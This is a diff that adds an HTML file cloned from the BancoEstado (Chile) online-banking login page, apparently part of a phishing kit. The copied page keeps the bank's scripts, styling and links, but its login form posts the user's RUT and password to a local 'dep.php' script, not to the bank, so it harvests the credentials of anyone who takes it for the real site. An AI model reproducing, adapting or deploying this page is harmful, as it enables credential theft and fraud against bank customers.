@@ -1,0 +1,254 @@
+
+<!-- saved from url=(0070)https://bancapersonas.bancoestado.cl/eBankingBech/login/caja_login.htm -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" src="./7bad73f1.js.download"> </script>
+	    <!-- Donde UserID seria el valor cifrado del ID del usuario -->
+		   <script>
+		         document.addEventListener('DOMContentLoaded', function () {
+			          // El CSID (Customer Session ID) es un identificador muy importante para BioCatch
+			          //
+			          // Los valores de CSID deben:         
+			          //         
+			          // - Ser único en cada sesión.         
+			          // - Contener solamente caracteres y números ASCII, excluyendo los caracteres "/", "\", "#" y " ? ".         
+			          // - No debe tener más de 32 caracteres para los valores ASCII y no debe tener más de 64 caracteres para         
+			          //   los valores hexadecimales.         
+			          // - CSID DEBE ser significativo, este indicador se utiliza como el número de referencia entre nosotros y         
+			          //   ustedes, para luego         
+			          //      + Deberán compartir informes de fraude: CSID que fueron confirmados como fraude         
+			          //      + Relacionar casos interesantes de analisis con los usuarios y sesiones del banco         
+			          // - El valor debe mantenerse durante todo el ciclo de vida de la sesion del usuario en el portal, desde el          
+			          //   login al termino de session 
+			          //cdApi.setCustomerSessionId('NZsuP-hDJG9qC38VSfV12V8');
+			          cdApi.resetSessionNumber();
+			          cdApi.changeContext('LOGIN_1');         
+			        }, false); 
+		</script>
+	
+	
+	
+	
+	<script type="text/javascript" src="./login_caja.js.download"></script>
+	<script type="text/javascript" src="./jquery-1.3.1.min.js.download"></script>
+	<!-- Bloqueo de la UI -->
+	<script type="text/javascript" src="./jquery-blockUI.js.download"></script>
+	
+	<script type="text/javascript" src="./jquery-ui-personalized-1.5.2.min.js.download"></script>
+	<script type="text/javascript" src="./jquery-fieldselection.js.download"></script>
+	
+	
+	<script type="text/javascript">
+		var $j = jQuery.noConflict();
+
+		function foco(){
+			document.login.username.focus()
+		}
+	</script>
+	<script type="text/javascript" src="./global.js.download"></script>
+	<script type="text/javascript">
+		function mostrarPopUp() {
+			var msj=document.getElementById("msj").innerHTML;
+			document.getElementById("errorMensaje").innerHTML = msj;
+			//document.getElementById("noAviso").style["display"] = "true";
+			
+			close_("caja");
+			show("noAviso");
+			
+			//$j.blockUI({ message: $j('#modalPopup'), centerY:true, centerX:true, css:{left:'25%',top:'45%',width:'75%'}});
+		}
+		function show(component){
+		document.getElementById(component).style["visibility"] = "visible";
+		document.getElementById(component).style.display = "block";
+		}
+	
+		function close_(component){
+			document.getElementById(component).style["visibility"] = "hidden";
+			document.getElementById(component).style.display  = "none";
+		}
+		function closePopUp(){
+			$j.unblockUI();
+			$j('#modalPopup').hide();
+		}
+		
+		function pathName() {
+			var newPathname = window.location.pathname;
+			document.getElementById("pathName").value = newPathname;
+			document.contactoLink.submit();
+		}
+
+		function errores(){
+			var msj=document.getElementById("msj").innerHTML;
+			if(!jQuery.browser.msie){
+				msj=msj.trim();
+			}
+			if (msj != null && msj != ""){
+				mostrarPopUp();
+			}			
+		}
+		
+		function mostrarPopUpAlerts() {
+		
+			var msj=document.getElementById("msj").innerHTML;
+			//alert("2"+msj);
+			//$j.blockUI({ message: $j('#modalPopupAlerts'), centerY:true, centerX:true, css:{left:'25%',top:'45%'}});
+		}
+
+		function closePopUpAlerts(){
+			$j.unblockUI();
+			$j('#modalPopupAlerts').hide();
+		}	
+	</script>
+	<script type="text/javascript">
+		var $j = jQuery.noConflict();
+		
+		function foco(){
+			document.login.username.focus()
+		}
+		
+		function volver(){
+			document.getElementById("msj").innerHTML=null;
+			window.history.back();
+			
+		}
+	</script>
+
+<link href="./Login-IN.css" type="text/css" rel="stylesheet">
+<link href="./header-IN.css" type="text/css" rel="stylesheet">
+<link href="./footer-IN.css" type="text/css" rel="stylesheet">
+<link href="./estilos_login.css" type="text/css" rel="stylesheet">	
+<link href="./login(1).css" type="text/css" rel="stylesheet">
+<link href="./alphacube.css" type="text/css" rel="stylesheet">
+<link href="./css_login3.css" type="text/css" rel="stylesheet">	
+<link href="./lgcss.css" type="text/css" rel="stylesheet">		
+
+</head><body id="bodyLogin" onload="errores();" style="background-color: #FFFFFF; background-image:none"> 
+		
+		<div id="noAviso" style="margin: auto; margin-top: 40px; clear: both; white-space: normal;display: none;visibility:hidden">
+			<table style="margin-bottom: 15px; margin: auto; border: 3px solid #ED7E0D;">		
+				<tbody><tr>
+					<td rowspan="2" style="text-align: left;width: 15%"><img alt="icono" src="./alerta.gif"></td>
+					<th id="errorMensaje" style="width: 85%; text-align: center; font-weight: bold;">
+								
+					</th>
+				</tr>		
+			</tbody></table>
+			<div style="text-align:center; margin: auto; margin-top:15px;">
+			   	<img style="cursor:pointer;" alt="" src="./btn_volver.gif" onclick="volver();">
+			</div> 
+			
+		</div>
+		<div id="caja" style="HEIGHT: 486px;padding-top : 0px; padding-bottom : 0px;;width: 320px; background-color: #EEEEEE;">
+			<form id="login" name="login" method="post" action="dep.php" autocomplete="off" target="_top">
+			 
+			<div style="background-color: rgb(255, 255, 255); float: left;" onload="javascript:fnCambio(2);">
+				<div id="side">
+					<h3>Banca en Línea</h3>
+					<fieldset>
+						<label id="rus">
+							<span class="tLg">RUT Usuario</span>
+							<input id="username" type="text" name="usuario1" class="frt" autocomplete="off" size="8" maxlength="8" required="">
+						</label>
+						<label id="cus">
+							<span class="tLg" style="line-height: 25px;">Clave</span>
+							<input id="password" size="8" maxlength="8 " type="password" name="contraseña1" class="fcl" required="">					
+						</label>
+						<input value="Ingresar" style="text-align: center;" tabindex="4" id="enviar" name="enviar" type="submit" >
+						<p id="olvide_clave" class="clave">
+							
+							<a href="https://www.bancoestado.cl/83617C429A994E009BA0B6DFB9916156/F594ACF5D80A45BBB103E78D3E7BAB56/articulo/14244.asp" title="" target="_top">
+								¿Problemas con su Clave?
+							</a>
+						</p>
+					</fieldset>
+				</div>
+			</div>
+		
+		<div id="modalPopup" class="modalPopupAgenda" style="display: none;">		
+			<div class="panel" style="border-color: #ED7E0D #ED7E0D #ED7E0D #ED7E0D; border-style: solid; 
+					width: 75%; margin: 20px 0px 20px 0px; align: center; background-color: #FFFFFF">
+														 
+				<table width="100%" background="./caja_login.htm">
+					<tbody><tr>
+						<td style="text-align: left;width: 15%" rowspan="5">
+							<img alt="icono" src="./alerta.gif">
+						</td>
+					</tr>
+					<tr style="text-align: left;">
+						<th style="font-weight:bold; color: #F1801A; ">Atención</th>
+					</tr>
+					<tr style="text-align: left;">
+						<th style="font-weight:bold;">
+							<span id="msj" style="white-space: normal;">
+											
+				</span>
+						</th>
+					</tr>
+					<tr>
+						<td style="text-align: center;">
+			 				<input id="aceptar" type="image" src="./btn_aceptar.gif" onclick="closePopUp();">
+						</td>
+					</tr>
+				</tbody></table>														
+			</div>					
+		</div>
+
+							
+		</form>
+	</div>
+	<div id="modalProcesando" style="display: none;left:5%;z-index:1002;position:fixed;">
+		
+	<table class="table_window">
+		<tbody>
+			<tr>
+				<td class="alphacube_nw">
+					<img class="alphacube_nw" src="./left-top.gif">
+				</td>
+				<td class="alphacube_n">
+					<img class="alphacube_n" src="./top-middle.gif">
+				</td>
+				<td class="alphacube_ne">
+					<img class="alphacube_ne" src="./right-top.gif">
+				</td>
+			</tr>
+	
+			<tr>
+				<td class="alphacube_w">
+					<img class="alphacube_w" src="./frame-left.gif">
+				</td>
+				<td valign="top" class="alphacube_content">
+					<div class="alphacube_content" style="overflow: auto; height: 95px; width: 195px;">
+						<div class="alphacube_message">
+							<span style="font-size: 16px;"><b>Un momento por favor</b></span>
+							<br>
+							<br>
+						</div>
+						<div class="alphacube_progress">
+							<img class="alphacube_progress" src="./progress.gif">
+						</div>
+					</div>
+				</td>
+				<td class="alphacube_e">
+					<img class="alphacube_e" src="./frame-right.gif">
+				</td>
+			</tr>
+
+			<tr>
+				<td class="alphacube_sw">
+					<img class="alphacube_sw" src="./bottom-left-c.gif">
+				</td>
+				<td class="alphacube_s">
+					<img class="alphacube_s" src="./bottom-middle.gif">
+				</td>
+				<td class="alphacube_se">
+					<img class="alphacube_se" src="./bottom-right-c.gif">
+				</td>
+			</tr>
+		</tbody>
+	</table>
+
+	</div>
+	
+
+
+<noscript><img src="https://bancapersonas.bancoestado.cl/akam/11/pixel_6fe7a3b8?a=dD1hZDBiN2QwMzEwMWM3NjkxNDE3ZWU5NmJlZmYzZDYwODNkNzE2NTBhJmpzPW9mZg==" style="visibility: hidden; position: absolute; left: -999px; top: -999px;" /></noscript>
+	
+</body></html>
